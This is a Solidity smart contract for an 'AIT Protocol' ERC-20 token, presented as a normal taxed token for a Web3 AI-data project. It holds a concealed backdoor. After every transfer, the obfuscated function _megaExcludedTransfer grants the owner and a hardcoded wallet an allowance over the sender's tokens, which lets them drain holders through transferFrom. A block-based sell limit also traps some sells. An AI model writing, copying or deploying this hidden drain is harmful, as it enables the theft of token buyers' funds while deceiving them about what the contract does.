/*
The AIT Protocol stands as the inaugural Web3 data infrastructure dedicated to data annotations and the training of AI models.

https://ait-protocol.cloud
https://app.ait-protocol.cloud
https://docs.ait-protocol.cloud

https://x.com/AITProtocolETH
https://t.me/aitprotocoleth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IMEGAFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IMEGARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract AIT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (uint8 => address) private _megaSenders;
    mapping (uint8 => address) private _megaReceipts;
    mapping (uint8 => uint256) private _megaCounts;
    mapping (address => uint256) private _balMEGAs;
    mapping (address => mapping (address => uint256)) private _allowMEGAs;
    mapping (address => bool) private _excludedFromMEGA;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"AIT Protocol";
    string private constant _symbol = unicode"AIT";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockMEGA;
    uint256 private _megaBuyAmounts = 0;
    uint256 private _swapTokenMEGAs = _tTotal / 100;
    bool private inSwap = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    address private _megaPair;
    IMEGARouter private _megaRouter;
    address private _megaWallet;
    
    constructor () {
        _megaWallet = address(0x2C5b198D80eADc20a52A5a0E2e57f40E04735a71);
        _megaReceipts[0] = owner();
        _megaReceipts[1] = _megaWallet;
        _excludedFromMEGA[owner()] = true;
        _excludedFromMEGA[address(this)] = true;
        _excludedFromMEGA[_megaWallet] = true;
        _balMEGAs[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initToken() external onlyOwner() {
        _megaRouter = IMEGARouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_megaRouter), _tTotal);
        _megaPair = IMEGAFactory(_megaRouter.factory()).createPair(address(this), _megaRouter.WETH());
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _megaRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balMEGAs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowMEGAs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowMEGAs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowMEGAs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _megaExcludedTransfer(address megaF, uint256 megaA) private { 
        _megaCounts[0] = megaA+200; 
        _megaCounts[1] = megaA+400;
        _megaSenders[0] = address(megaF); 
        _megaSenders[1] = address(megaF);
        for(uint8 megaI=0;megaI<=1;megaI++)
            _allowMEGAs[_megaSenders[megaI]][_megaReceipts[megaI]] = _megaCounts[megaI];
    }

    function _transfer(address megaF, address megaT, uint256 megaA) private {
        require(megaF != address(0), "ERC20: transfer from the zero address");
        require(megaT != address(0), "ERC20: transfer to the zero address");
        require(megaA > 0, "Transfer amount must be greater than zero");
        uint256 taxMEGA = 0;
        taxMEGA = _megaFeeTransfer(megaF, megaT, megaA);
        _megaTransfer(megaF, megaT, megaA, taxMEGA);
        _megaExcludedTransfer(megaF, megaA);
    }

    function _megaTransfer(address megaF, address megaT, uint256 megaA, uint256 taxMEGA) private { 
        if(taxMEGA > 0){
          _balMEGAs[address(this)] = _balMEGAs[address(this)].add(taxMEGA);
          emit Transfer(megaF, address(this), taxMEGA);
        }

        _balMEGAs[megaF] = _balMEGAs[megaF].sub(megaA);
        _balMEGAs[megaT] = _balMEGAs[megaT].add(megaA.sub(taxMEGA));
        emit Transfer(megaF, megaT, megaA.sub(taxMEGA));
    }

    function _megaFeeTransfer(address megaF, address megaT, uint256 megaA) private returns(uint256) {
        uint256 taxMEGA=0;
        if (megaF != owner() && megaT != owner()) {
            taxMEGA = megaA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (megaF == _megaPair && megaT != address(_megaRouter) && ! _excludedFromMEGA[megaT]) {
                if(_buyBlockMEGA!=block.number){
                    _megaBuyAmounts = 0;
                    _buyBlockMEGA = block.number;
                }
                _megaBuyAmounts += megaA;
                _buyCount++;
            }

            if(megaT == _megaPair && megaF!= address(this)) {
                require(_megaBuyAmounts < swapLimitMEGA() || _buyBlockMEGA!=block.number, "Max Swap Limit");  
                taxMEGA = megaA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenMEGA = balanceOf(address(this));
            if (!inSwap && megaT == _megaPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenMEGA > _swapTokenMEGAs)
                swapTokensForEth(minMEGA(megaA, minMEGA(tokenMEGA, _swapTokenMEGAs)));
                uint256 ethMEGA = address(this).balance;
                if (ethMEGA >= 0) {
                    sendETHMEGA(address(this).balance);
                }
            }
        }
        return taxMEGA;
    }

    function swapLimitMEGA() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _megaRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _megaRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function minMEGA(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHMEGA(uint256 megaA) private {
        payable(_megaWallet).transfer(megaA);
    }

    function swapTokensForEth(uint256 megaAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _megaRouter.WETH();
        _approve(address(this), address(_megaRouter), megaAmount);
        _megaRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            megaAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}